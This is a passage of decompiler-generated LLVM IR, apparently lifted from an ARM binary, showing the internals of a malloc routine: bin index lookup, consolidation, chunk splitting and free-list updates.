  store i32 %v0_13298, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1367c

dec_label_pc_132a0:                               ; preds = %bb144
  %v0_132a0 = load i32, i32* @sl, align 4
  %tmp205 = icmp ugt i32 %v0_132a0, %v2_13280
  br i1 %tmp205, label %dec_label_pc_132c8, label %dec_label_pc_132a8

dec_label_pc_132a8:                               ; preds = %dec_label_pc_132a0
  %v1_132a8 = add i32 %v4_1327c, -4
  store i32 %v1_132a8, i32* %r1.global-to-local, align 4
  %v3_132ac = udiv i32 %v0_132a0, 8
  store i32 %v3_132ac, i32* %r2.global-to-local, align 4
  %v4_132b0 = mul nuw i32 %v3_132ac, 4
  %v5_132b0 = add i32 %v4_132b0, %v1_132a8
  %v6_132b0 = inttoptr i32 %v5_132b0 to i32*
  %v7_132b0 = load i32, i32* %v6_132b0, align 4
  store i32 %v7_132b0, i32* %r0.global-to-local, align 4
  %v2_132b4 = icmp eq i32 %v7_132b0, 0
  br i1 %v2_132b4, label %dec_label_pc_132c8, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_132a8
  %v2_132b8 = add i32 %v7_132b0, 8
  %v3_132b8 = inttoptr i32 %v2_132b8 to i32*
  %v4_132b8 = load i32, i32* %v3_132b8, align 4
  store i32 %v4_132b8, i32* %r3.global-to-local, align 4
  store i32 %v2_132b8, i32* %r0.global-to-local, align 4
  store i32 %v2_132b8, i32* %r4.global-to-local, align 4
  store i32 %v4_132b8, i32* %v6_132b0, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_132c8:                               ; preds = %dec_label_pc_132a8, %dec_label_pc_132a0
  %tmp206 = icmp ugt i32 %v0_132a0, 255
  br i1 %tmp206, label %dec_label_pc_13318, label %dec_label_pc_132d0

dec_label_pc_132d0:                               ; preds = %dec_label_pc_132c8
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_132d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  %v3_132dc = udiv i32 %v0_132a0, 8
  store i32 %v3_132dc, i32* @r7, align 4
  %v4_132e0 = mul nuw i32 %v3_132dc, 8
  %v5_132e0 = add i32 %v4_132d8, %v4_132e0
  store i32 %v5_132e0, i32* %r3.global-to-local, align 4
  %v1_132e4 = add i32 %v5_132e0, 44
  store i32 %v1_132e4, i32* %ip.global-to-local, align 4
  %v1_132e8 = add i32 %v5_132e0, 56
  %v2_132e8 = inttoptr i32 %v1_132e8 to i32*
  %v3_132e8 = load i32, i32* %v2_132e8, align 4
  store i32 %v3_132e8, i32* %r0.global-to-local, align 4
  %v9_132ec = icmp eq i32 %v3_132e8, %v1_132e4
  br i1 %v9_132ec, label %dec_label_pc_13478, label %dec_label_pc_132f4

dec_label_pc_132f4:                               ; preds = %dec_label_pc_132d0
  %v2_132f4 = add i32 %v3_132e8, %v0_132a0
  store i32 %v2_132f4, i32* %r3.global-to-local, align 4
  %v1_132f8 = add i32 %v2_132f4, 4
  %v2_132f8 = inttoptr i32 %v1_132f8 to i32*
  %v3_132f8 = load i32, i32* %v2_132f8, align 4
  store i32 %v3_132f8, i32* %r2.global-to-local, align 4
  %v1_132fc = add i32 %v3_132e8, 12
  %v2_132fc = inttoptr i32 %v1_132fc to i32*
  %v3_132fc = load i32, i32* %v2_132fc, align 4
  store i32 %v3_132fc, i32* %r1.global-to-local, align 4
  %v1_13300 = or i32 %v3_132f8, 1
  store i32 %v1_13300, i32* %r2.global-to-local, align 4
  %v1_13304 = add i32 %v3_132e8, 8
  store i32 %v1_13304, i32* %r4.global-to-local, align 4
  store i32 %v1_13300, i32* %v2_132f8, align 4
  %v0_1330c = load i32, i32* %ip.global-to-local, align 4
  %v1_1330c = load i32, i32* %r1.global-to-local, align 4
  %v2_1330c = add i32 %v1_1330c, 8
  %v3_1330c = inttoptr i32 %v2_1330c to i32*
  store i32 %v0_1330c, i32* %v3_1330c, align 4
  %v0_13310 = load i32, i32* %r1.global-to-local, align 4
  %v1_13310 = load i32, i32* %ip.global-to-local, align 4
  %v2_13310 = add i32 %v1_13310, 12
  %v3_13310 = inttoptr i32 %v2_13310 to i32*
  store i32 %v0_13310, i32* %v3_13310, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_13318:                               ; preds = %dec_label_pc_132c8
  store i32 %v0_132a0, i32* %r0.global-to-local, align 4
  %v1_1331c = call i32 @__malloc_largebin_index(i32 %v0_132a0)
  store i32 %v1_1331c, i32* %r0.global-to-local, align 4
  %v0_13320 = load i32, i32* @r4, align 4
  %v1_13320 = and i32 %v0_13320, 2
  %v2_13320 = icmp eq i32 %v1_13320, 0
  store i32 %v1_1331c, i32* @r7, align 4
  br i1 %v2_13320, label %dec_label_pc_13478, label %dec_label_pc_1332c

dec_label_pc_1332c:                               ; preds = %dec_label_pc_13318
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r1.global-to-local, align 4
  %v4_13334 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_13334, i32* @r0, align 4
  %v0_13338 = call i32 @__malloc_consolidate()
  store i32 %v0_13338, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13478

dec_label_pc_13340:                               ; preds = %dec_label_pc_1348c
  %v1_13340 = add i32 %v3_1348c, 4
  %v2_13340 = inttoptr i32 %v1_13340 to i32*
  %v3_13340 = load i32, i32* %v2_13340, align 4
  store i32 %v3_13340, i32* %r3.global-to-local, align 4
  %v0_13344 = load i32, i32* @sl, align 4
  %v1_13348 = and i32 %v3_13340, -4
  store i32 %v1_13348, i32* %r4.global-to-local, align 4
  %v1_1334c = add i32 %v3_1348c, 12
  %v2_1334c = inttoptr i32 %v1_1334c to i32*
  %v3_1334c = load i32, i32* %v2_1334c, align 4
  store i32 %v3_1334c, i32* %ip.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v0_13344, 255
  br i1 %tmp207, label %dec_label_pc_133a8, label %dec_label_pc_13354

dec_label_pc_13354:                               ; preds = %dec_label_pc_13340
  %v9_13354 = icmp eq i32 %v3_1334c, %v0_133ac
  br i1 %v9_13354, label %dec_label_pc_1335c, label %dec_label_pc_133a8

dec_label_pc_1335c:                               ; preds = %dec_label_pc_13354
  %v0_1335c = load i32, i32* @sb, align 4
  %v1_1335c = add i32 %v0_1335c, 48
  %v2_1335c = inttoptr i32 %v1_1335c to i32*
  %v3_1335c = load i32, i32* %v2_1335c, align 4
  store i32 %v3_1335c, i32* %r3.global-to-local, align 4
  %v9_13360 = icmp eq i32 %v3_1348c, %v3_1335c
  br i1 %v9_13360, label %dec_label_pc_13368, label %dec_label_pc_133a8

dec_label_pc_13368:                               ; preds = %dec_label_pc_1335c
  %v1_13368 = load i32, i32* @fp, align 4
  %tmp208 = icmp ugt i32 %v1_13348, %v1_13368
  br i1 %tmp208, label %dec_label_pc_13370, label %dec_label_pc_133a8

dec_label_pc_13370:                               ; preds = %dec_label_pc_13368
  %v2_13370 = sub i32 %v1_13348, %v0_13344
  store i32 %v2_13370, i32* %r2.global-to-local, align 4
  %v2_13374 = add i32 %v0_13344, %v3_1348c
  store i32 %v2_13374, i32* %r3.global-to-local, align 4
  %v1_13378 = or i32 %v0_13344, 1
  store i32 %v1_13378, i32* %r0.global-to-local, align 4
  %v1_1337c = or i32 %v2_13370, 1
  store i32 %v1_1337c, i32* %r1.global-to-local, align 4
  %v1_13380 = add i32 %v3_1348c, 8
  store i32 %v1_13380, i32* %r4.global-to-local, align 4
  %v2_13384 = add i32 %v0_133ac, 8
  %v3_13384 = inttoptr i32 %v2_13384 to i32*
  store i32 %v2_13374, i32* %v3_13384, align 4
  %v0_13388 = load i32, i32* %r3.global-to-local, align 4
  %v1_13388 = load i32, i32* %ip.global-to-local, align 4
  %v2_13388 = add i32 %v1_13388, 12
  %v3_13388 = inttoptr i32 %v2_13388 to i32*
  store i32 %v0_13388, i32* %v3_13388, align 4
  %v0_1338c = load i32, i32* %r0.global-to-local, align 4
  %v1_1338c = load i32, i32* @r6, align 4
  %v2_1338c = add i32 %v1_1338c, 4
  %v3_1338c = inttoptr i32 %v2_1338c to i32*
  store i32 %v0_1338c, i32* %v3_1338c, align 4
  %v0_13390 = load i32, i32* %r3.global-to-local, align 4
  %v1_13390 = load i32, i32* @sb, align 4
  %v2_13390 = add i32 %v1_13390, 48
  %v3_13390 = inttoptr i32 %v2_13390 to i32*
  store i32 %v0_13390, i32* %v3_13390, align 4
  %v0_13394 = load i32, i32* %r2.global-to-local, align 4
  %v1_13394 = load i32, i32* %r3.global-to-local, align 4
  %v3_13394 = add i32 %v1_13394, %v0_13394
  %v4_13394 = inttoptr i32 %v3_13394 to i32*
  store i32 %v0_13394, i32* %v4_13394, align 4
  %v0_13398 = load i32, i32* %r1.global-to-local, align 4
  %v1_13398 = load i32, i32* %r3.global-to-local, align 4
  %v2_13398 = add i32 %v1_13398, 4
  %v3_13398 = inttoptr i32 %v2_13398 to i32*
  store i32 %v0_13398, i32* %v3_13398, align 4
  %v0_1339c = load i32, i32* %ip.global-to-local, align 4
  %v1_1339c = load i32, i32* %r3.global-to-local, align 4
  %v2_1339c = add i32 %v1_1339c, 12
  %v3_1339c = inttoptr i32 %v2_1339c to i32*
  store i32 %v0_1339c, i32* %v3_1339c, align 4
  %v0_133a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_133a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_133a0 = add i32 %v1_133a0, 8
  %v3_133a0 = inttoptr i32 %v2_133a0 to i32*
  store i32 %v0_133a0, i32* %v3_133a0, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_133a8:                               ; preds = %dec_label_pc_13368, %dec_label_pc_1335c, %dec_label_pc_13354, %dec_label_pc_13340
  %v9_133a8 = icmp eq i32 %v1_13348, %v0_13344
  %v2_133ac = add i32 %v3_1334c, 8
  %v3_133ac = inttoptr i32 %v2_133ac to i32*
  store i32 %v0_133ac, i32* %v3_133ac, align 4
  %v0_133b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_133b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_133b0 = add i32 %v1_133b0, 12
  %v3_133b0 = inttoptr i32 %v2_133b0 to i32*
  store i32 %v0_133b0, i32* %v3_133b0, align 4
  br i1 %v9_133a8, label %dec_label_pc_13508.loopexit, label %dec_label_pc_133c4

dec_label_pc_133c4:                               ; preds = %dec_label_pc_133a8
  %v0_133c4 = load i32, i32* %r4.global-to-local, align 4
  %tmp209 = icmp ugt i32 %v0_133c4, 255
  br i1 %tmp209, label %dec_label_pc_133e8, label %dec_label_pc_133cc

dec_label_pc_133cc:                               ; preds = %dec_label_pc_133c4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  %v1_133d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_133d0 = add i32 %v1_133d0, ptrtoint (i32* @global_var_23010.366 to i32)
  %v3_133d0 = inttoptr i32 %v2_133d0 to i32*
  %v4_133d0 = load i32, i32* %v3_133d0, align 4
  %v3_133d4 = udiv i32 %v0_133c4, 8
  store i32 %v3_133d4, i32* %r0.global-to-local, align 4
  %v4_133d8 = mul nuw i32 %v3_133d4, 8
  %v5_133d8 = add i32 %v4_133d0, %v4_133d8
  store i32 %v5_133d8, i32* %r3.global-to-local, align 4
  %v1_133dc = add i32 %v5_133d8, 44
  store i32 %v1_133dc, i32* %ip.global-to-local, align 4
  %v1_133e0 = add i32 %v5_133d8, 52
  %v2_133e0 = inttoptr i32 %v1_133e0 to i32*
  %v3_133e0 = load i32, i32* %v2_133e0, align 4
  store i32 %v3_133e0, i32* @lr, align 4
  br label %dec_label_pc_13440

dec_label_pc_133e8:                               ; preds = %dec_label_pc_133c4
  store i32 %v0_133c4, i32* %r0.global-to-local, align 4
  %v1_133ec = call i32 @__malloc_largebin_index(i32 %v0_133c4)
  store i32 %v1_133ec, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %ip.global-to-local, align 4
  %v1_133f4 = load i32, i32* %r8.global-to-local, align 4
  %v2_133f4 = add i32 %v1_133f4, ptrtoint (i32* @global_var_23010.366 to i32)
  %v3_133f4 = inttoptr i32 %v2_133f4 to i32*
  %v4_133f4 = load i32, i32* %v3_133f4, align 4
  %v4_133f8 = mul i32 %v1_133ec, 8
  %v5_133f8 = add i32 %v4_133f4, %v4_133f8
  store i32 %v5_133f8, i32* %r3.global-to-local, align 4
  %v1_133fc = add i32 %v5_133f8, 44
  store i32 %v1_133fc, i32* %ip.global-to-local, align 4
  %v1_13400 = add i32 %v5_133f8, 52
  %v2_13400 = inttoptr i32 %v1_13400 to i32*
  %v3_13400 = load i32, i32* %v2_13400, align 4
  store i32 %v3_13400, i32* @lr, align 4
  %v9_13404 = icmp eq i32 %v3_13400, %v1_133fc
  br i1 %v9_13404, label %dec_label_pc_13440, label %dec_label_pc_1340c

dec_label_pc_1340c:                               ; preds = %dec_label_pc_133e8
  %v1_1340c = add i32 %v5_133f8, 56
  %v2_1340c = inttoptr i32 %v1_1340c to i32*
  %v3_1340c = load i32, i32* %v2_1340c, align 4
  store i32 %v3_1340c, i32* %r1.global-to-local, align 4
  %v1_13410 = add i32 %v3_1340c, 4
  %v2_13410 = inttoptr i32 %v1_13410 to i32*
  %v3_13410 = load i32, i32* %v2_13410, align 4
  store i32 %v3_13410, i32* %r3.global-to-local, align 4
  %v0_13414 = load i32, i32* %r4.global-to-local, align 4
  %v3_13414 = icmp ult i32 %v0_13414, %v3_13410
  br i1 %v3_13414, label %.thread, label %dec_label_pc_13430.preheader

.thread:                                          ; preds = %dec_label_pc_1340c
  store i32 %v1_133fc, i32* @lr, align 4
  store i32 %v3_1340c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13440

dec_label_pc_13430.preheader:                     ; preds = %dec_label_pc_1340c
  %v2_1341c = or i32 %v0_13414, 1
  store i32 %v2_1341c, i32* %r2.global-to-local, align 4
  %v1_13430183 = add i32 %v3_13400, 4
  %v2_13430184 = inttoptr i32 %v1_13430183 to i32*
  %v3_13430185 = load i32, i32* %v2_13430184, align 4
  store i32 %v3_13430185, i32* %r3.global-to-local, align 4
  %v3_13434187 = icmp ult i32 %v2_1341c, %v3_13430185
  br i1 %v3_13434187, label %dec_label_pc_1342c, label %dec_label_pc_1343c

dec_label_pc_1342c:                               ; preds = %dec_label_pc_13430.preheader, %dec_label_pc_1342c
  %v0_1343c188 = phi i32 [ %v3_1342c, %dec_label_pc_1342c ], [ %v3_13400, %dec_label_pc_13430.preheader ]
  %v1_1342c = add i32 %v0_1343c188, 8
  %v2_1342c = inttoptr i32 %v1_1342c to i32*
  %v3_1342c = load i32, i32* %v2_1342c, align 4
  store i32 %v3_1342c, i32* @lr, align 4
  %v1_13430 = add i32 %v3_1342c, 4
  %v2_13430 = inttoptr i32 %v1_13430 to i32*
  %v3_13430 = load i32, i32* %v2_13430, align 4
  store i32 %v3_13430, i32* %r3.global-to-local, align 4
  %v3_13434 = icmp ult i32 %v2_1341c, %v3_13430
  br i1 %v3_13434, label %dec_label_pc_1342c, label %dec_label_pc_1343c

dec_label_pc_1343c:                               ; preds = %dec_label_pc_1342c, %dec_label_pc_13430.preheader
  %v0_1343c.lcssa = phi i32 [ %v3_13400, %dec_label_pc_13430.preheader ], [ %v3_1342c, %dec_label_pc_1342c ]
  %v1_1343c = add i32 %v0_1343c.lcssa, 12
  %v2_1343c = inttoptr i32 %v1_1343c to i32*
  %v3_1343c = load i32, i32* %v2_1343c, align 4
  store i32 %v3_1343c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13440

dec_label_pc_13440:                               ; preds = %.thread, %dec_label_pc_133e8, %dec_label_pc_133cc, %dec_label_pc_1343c
  %v0_13460 = phi i32 [ %v1_133fc, %dec_label_pc_133e8 ], [ %v1_133dc, %dec_label_pc_133cc ], [ %v3_1343c, %dec_label_pc_1343c ], [ %v3_1340c, %.thread ]
  %v0_13454 = phi i32 [ %v1_133ec, %dec_label_pc_133e8 ], [ %v3_133d4, %dec_label_pc_133cc ], [ %v1_133ec, %dec_label_pc_1343c ], [ %v1_133ec, %.thread ]
  %v1_13444 = phi i32 [ %v1_133f4, %dec_label_pc_133e8 ], [ %v1_133d0, %dec_label_pc_133cc ], [ %v1_133f4, %dec_label_pc_1343c ], [ %v1_133f4, %.thread ]
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  %v2_13444 = add i32 %v1_13444, ptrtoint (i32* @global_var_23010.366 to i32)
  %v3_13444 = inttoptr i32 %v2_13444 to i32*
  %v4_13444 = load i32, i32* %v3_13444, align 4
  %v3_13448 = sdiv i32 %v0_13454, 32
  store i32 %v3_13448, i32* %r3.global-to-local, align 4
  %v4_1344c = mul nsw i32 %v3_13448, 4
  %v5_1344c = add i32 %v4_13444, %v4_1344c
  store i32 %v5_1344c, i32* %r1.global-to-local, align 4
  %v1_13450 = add i32 %v5_1344c, 820
  %v2_13450 = inttoptr i32 %v1_13450 to i32*
  %v3_13450 = load i32, i32* %v2_13450, align 4
  %v1_13454 = urem i32 %v0_13454, 32
  store i32 %v1_13454, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_1345c = shl i32 1, %v1_13454
  %v8_1345c = or i32 %v3_13450, %v7_1345c
  store i32 %v8_1345c, i32* %r3.global-to-local, align 4
  %v1_13460 = load i32, i32* @r6, align 4
  %v2_13460 = add i32 %v1_13460, 12
  %v3_13460 = inttoptr i32 %v2_13460 to i32*
  store i32 %v0_13460, i32* %v3_13460, align 4
  %v0_13464 = load i32, i32* @lr, align 4
  %v1_13464 = load i32, i32* @r6, align 4
  %v2_13464 = add i32 %v1_13464, 8
  %v3_13464 = inttoptr i32 %v2_13464 to i32*
  store i32 %v0_13464, i32* %v3_13464, align 4
  %v0_13468 = load i32, i32* %r3.global-to-local, align 4
  %v1_13468 = load i32, i32* %r1.global-to-local, align 4
  %v2_13468 = add i32 %v1_13468, 820
  %v3_13468 = inttoptr i32 %v2_13468 to i32*
  store i32 %v0_13468, i32* %v3_13468, align 4
  %v0_1346c = load i32, i32* @r6, align 4
  %v1_1346c = load i32, i32* @lr, align 4
  %v2_1346c = add i32 %v1_1346c, 12
  %v3_1346c = inttoptr i32 %v2_1346c to i32*
  store i32 %v0_1346c, i32* %v3_1346c, align 4
  %v0_13470 = load i32, i32* @r6, align 4
  %v1_13470 = load i32, i32* %ip.global-to-local, align 4
  %v2_13470 = add i32 %v1_13470, 8
  %v3_13470 = inttoptr i32 %v2_13470 to i32*
  store i32 %v0_13470, i32* %v3_13470, align 4
  %v0_1348c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1348c

dec_label_pc_13478:                               ; preds = %dec_label_pc_13318, %dec_label_pc_132d0, %dec_label_pc_1332c
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r1.global-to-local, align 4
  %v4_13480 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_13480, i32* @sb, align 4
  %v0_13484 = load i32, i32* @sl, align 4
  %v1_13484 = add i32 %v0_13484, 16
  store i32 %v1_13484, i32* @fp, align 4
  %v1_13488 = add i32 %v4_13480, 52
  store i32 %v1_13488, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1348c

dec_label_pc_1348c:                               ; preds = %dec_label_pc_13440, %dec_label_pc_13478
  %v0_133ac = phi i32 [ %v0_1348c.pre, %dec_label_pc_13440 ], [ %v1_13488, %dec_label_pc_13478 ]
  %v1_1348c = add i32 %v0_133ac, 12
  %v2_1348c = inttoptr i32 %v1_1348c to i32*
  %v3_1348c = load i32, i32* %v2_1348c, align 4
  store i32 %v3_1348c, i32* @r6, align 4
  %v9_13490 = icmp eq i32 %v3_1348c, %v0_133ac
  br i1 %v9_13490, label %dec_label_pc_13498, label %dec_label_pc_13340

dec_label_pc_13498:                               ; preds = %dec_label_pc_1348c
  %v0_13498 = load i32, i32* @sl, align 4
  %tmp210 = icmp ult i32 %v0_13498, 256
  %v0_13550.pre = load i32, i32* @r7, align 4
  br i1 %tmp210, label %dec_label_pc_13498.dec_label_pc_13550_crit_edge, label %dec_label_pc_134a0

dec_label_pc_13498.dec_label_pc_13550_crit_edge:  ; preds = %dec_label_pc_13498
  %.pre204 = mul i32 %v0_13550.pre, 8
  br label %dec_label_pc_13550

dec_label_pc_134a0:                               ; preds = %dec_label_pc_13498
  %v4_134a0 = mul i32 %v0_13550.pre, 8
  %v5_134a0 = add i32 %v4_134a0, %v0_133ac
  store i32 %v5_134a0, i32* %r3.global-to-local, align 4
  %v1_134a4 = add i32 %v5_134a0, -8
  store i32 %v1_134a4, i32* %r1.global-to-local, align 4
  %v1_134a8 = add i32 %v5_134a0, 4
  %v2_134a8 = inttoptr i32 %v1_134a8 to i32*
  %storemerge.pre = load i32, i32* %v2_134a8, align 4
  br label %dec_label_pc_13548

dec_label_pc_134b0:                               ; preds = %dec_label_pc_13548
  %v1_134b0 = add i32 %v1_134d8, 4
  %v2_134b0 = inttoptr i32 %v1_134b0 to i32*
  %v3_134b0 = load i32, i32* %v2_134b0, align 4
  store i32 %v3_134b0, i32* %r3.global-to-local, align 4
  %v1_134b4 = and i32 %v3_134b0, -4
  store i32 %v1_134b4, i32* %r2.global-to-local, align 4
  %v3_134b8 = icmp ult i32 %v1_134b4, %v0_13498
  %v1_134bc = add i32 %v1_134d8, 12
  %v2_134bc = inttoptr i32 %v1_134bc to i32*
  %v3_134bc = load i32, i32* %v2_134bc, align 4
  store i32 %v3_134bc, i32* %r0.global-to-local, align 4
  br i1 %v3_134b8, label %dec_label_pc_13548, label %dec_label_pc_134c4

dec_label_pc_134c4:                               ; preds = %dec_label_pc_134b0
  %v1_134c4 = add i32 %v1_134d8, 8
  %v2_134c4 = inttoptr i32 %v1_134c4 to i32*
  %v3_134c4 = load i32, i32* %v2_134c4, align 4
  store i32 %v3_134c4, i32* %r1.global-to-local, align 4
  %v1_134c8 = add i32 %v3_134c4, 12
  %v2_134c8 = inttoptr i32 %v1_134c8 to i32*
  %v3_134c8 = load i32, i32* %v2_134c8, align 4
  store i32 %v3_134c8, i32* %r3.global-to-local, align 4
  %v9_134cc = icmp eq i32 %v3_134c8, %v1_134d8
  br i1 %v9_134cc, label %dec_label_pc_134d4, label %dec_label_pc_134e0

dec_label_pc_134d4:                               ; preds = %dec_label_pc_134c4
  %v1_134d4 = add i32 %v3_134bc, 8
  %v2_134d4 = inttoptr i32 %v1_134d4 to i32*
  %v3_134d4 = load i32, i32* %v2_134d4, align 4
  store i32 %v3_134d4, i32* %r3.global-to-local, align 4
  %v9_134d8 = icmp eq i32 %v3_134d4, %v1_134d8
  br i1 %v9_134d8, label %dec_label_pc_134e4, label %dec_label_pc_134e0

dec_label_pc_134e0:                               ; preds = %dec_label_pc_134c4, %dec_label_pc_134d4
  %v0_134e0 = call i32 @abort()
  store i32 %v0_134e0, i32* %r0.global-to-local, align 4
  %v0_134e4.pre = load i32, i32* @sl, align 4
  %v1_134e4.pre = load i32, i32* @r2, align 4
  %v0_134ec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134d4, %dec_label_pc_134e0
  %v1_134ec = phi i32 [ %v3_134bc, %dec_label_pc_134d4 ], [ %v0_134e0, %dec_label_pc_134e0 ]
  %v0_134ec = phi i32 [ %v3_134c4, %dec_label_pc_134d4 ], [ %v0_134ec.pre, %dec_label_pc_134e0 ]
  %v1_134e4 = phi i32 [ %v1_134b4, %dec_label_pc_134d4 ], [ %v1_134e4.pre, %dec_label_pc_134e0 ]
  %v0_134e4 = phi i32 [ %v0_13498, %dec_label_pc_134d4 ], [ %v0_134e4.pre, %dec_label_pc_134e0 ]
  %v2_134e4 = sub i32 %v1_134e4, %v0_134e4
  store i32 %v2_134e4, i32* %lr.global-to-local, align 4
  %v2_134ec = add i32 %v1_134ec, 8
  %v3_134ec = inttoptr i32 %v2_134ec to i32*
  store i32 %v0_134ec, i32* %v3_134ec, align 4
  %v0_134f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_134f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_134f0 = add i32 %v1_134f0, 12
  %v3_134f0 = inttoptr i32 %v2_134f0 to i32*
  store i32 %v0_134f0, i32* %v3_134f0, align 4
  %v0_134f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_134f4 = add i32 %v0_134f4, 8
  store i32 %v1_134f4, i32* %r0.global-to-local, align 4
  %tmp211 = icmp ugt i32 %v2_134e4, 15
  br i1 %tmp211, label %dec_label_pc_13514, label %dec_label_pc_134fc

dec_label_pc_134fc:                               ; preds = %dec_label_pc_134e4
  %v1_134fc = load i32, i32* %r2.global-to-local, align 4
  %v2_134fc = add i32 %v1_134fc, %v0_134f4
  store i32 %v2_134fc, i32* %r2.global-to-local, align 4
  %v1_13500 = add i32 %v2_134fc, 4
  %v2_13500 = inttoptr i32 %v1_13500 to i32*
  %v3_13500 = load i32, i32* %v2_13500, align 4
  store i32 %v3_13500, i32* %r3.global-to-local, align 4
  store i32 %v1_134f4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_13508.loopexit:                      ; preds = %dec_label_pc_133a8
  %v1_133b4 = load i32, i32* @r6, align 4
  %v2_133b4 = load i32, i32* @sl, align 4
  %v3_133b4 = add i32 %v2_133b4, %v1_133b4
  store i32 %v3_133b4, i32* %r2.global-to-local, align 4
  %v2_133b8 = add i32 %v3_133b4, 4
  %v3_133b8 = inttoptr i32 %v2_133b8 to i32*
  %v4_133b8 = load i32, i32* %v3_133b8, align 4
  store i32 %v4_133b8, i32* %r3.global-to-local, align 4
  %v2_133bc = add i32 %v1_133b4, 8
  store i32 %v2_133bc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_13508:                               ; preds = %.dec_label_pc_13508_crit_edge, %dec_label_pc_13508.loopexit, %dec_label_pc_134fc
  %v1_1350c = phi i32 [ %v4_13630, %.dec_label_pc_13508_crit_edge ], [ %v3_133b4, %dec_label_pc_13508.loopexit ], [ %v2_134fc, %dec_label_pc_134fc ]
  %v0_13508 = phi i32 [ %v7_13630, %.dec_label_pc_13508_crit_edge ], [ %v4_133b8, %dec_label_pc_13508.loopexit ], [ %v3_13500, %dec_label_pc_134fc ]
  %v1_13508 = or i32 %v0_13508, 1
  store i32 %v1_13508, i32* %r3.global-to-local, align 4
  %v2_1350c = add i32 %v1_1350c, 4
  %v3_1350c = inttoptr i32 %v2_1350c to i32*
  store i32 %v1_13508, i32* %v3_1350c, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_13514:                               ; preds = %dec_label_pc_134e4
  %v1_13514 = load i32, i32* @sl, align 4
  %v2_13514 = add i32 %v1_13514, %v0_134f4
  store i32 %v2_13514, i32* %r2.global-to-local, align 4
  %v1_13518 = or i32 %v1_13514, 1
  store i32 %v1_13518, i32* %r3.global-to-local, align 4
  %v0_1351c = load i32, i32* %lr.global-to-local, align 4
  %v1_1351c = or i32 %v0_1351c, 1
  store i32 %v1_1351c, i32* %r1.global-to-local, align 4
  store i32 %v1_134f4, i32* %r4.global-to-local, align 4
  %v2_13524 = add i32 %v0_134f4, 4
  %v3_13524 = inttoptr i32 %v2_13524 to i32*
  store i32 %v1_13518, i32* %v3_13524, align 4
  %v0_13528 = load i32, i32* %r2.global-to-local, align 4
  %v1_13528 = load i32, i32* @r6, align 4
  %v2_13528 = add i32 %v1_13528, 8
  %v3_13528 = inttoptr i32 %v2_13528 to i32*
  store i32 %v0_13528, i32* %v3_13528, align 4
  %v0_1352c = load i32, i32* %r2.global-to-local, align 4
  %v1_1352c = load i32, i32* @r6, align 4
  %v2_1352c = add i32 %v1_1352c, 12
  %v3_1352c = inttoptr i32 %v2_1352c to i32*
  store i32 %v0_1352c, i32* %v3_1352c, align 4
  %v0_13530 = load i32, i32* %lr.global-to-local, align 4
  %v1_13530 = load i32, i32* %r2.global-to-local, align 4
  %v3_13530 = add i32 %v1_13530, %v0_13530
  %v4_13530 = inttoptr i32 %v3_13530 to i32*
  store i32 %v0_13530, i32* %v4_13530, align 4
  %v0_13534 = load i32, i32* %r1.global-to-local, align 4
  %v1_13534 = load i32, i32* %r2.global-to-local, align 4
  %v2_13534 = add i32 %v1_13534, 4
  %v3_13534 = inttoptr i32 %v2_13534 to i32*
  store i32 %v0_13534, i32* %v3_13534, align 4
  %v0_13538 = load i32, i32* @r6, align 4
  %v1_13538 = load i32, i32* %r2.global-to-local, align 4
  %v2_13538 = add i32 %v1_13538, 12
  %v3_13538 = inttoptr i32 %v2_13538 to i32*
  store i32 %v0_13538, i32* %v3_13538, align 4
  %v0_1353c = load i32, i32* @r6, align 4
  %v1_1353c = load i32, i32* %r2.global-to-local, align 4
  %v2_1353c = add i32 %v1_1353c, 8
  %v3_1353c = inttoptr i32 %v2_1353c to i32*
  store i32 %v0_1353c, i32* %v3_1353c, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_13548:                               ; preds = %dec_label_pc_134b0, %dec_label_pc_134a0
  %v1_134d8 = phi i32 [ %storemerge.pre, %dec_label_pc_134a0 ], [ %v3_134bc, %dec_label_pc_134b0 ]
  store i32 %v1_134d8, i32* %ip.global-to-local, align 4
  %v9_13548 = icmp eq i32 %v1_134d8, %v1_134a4
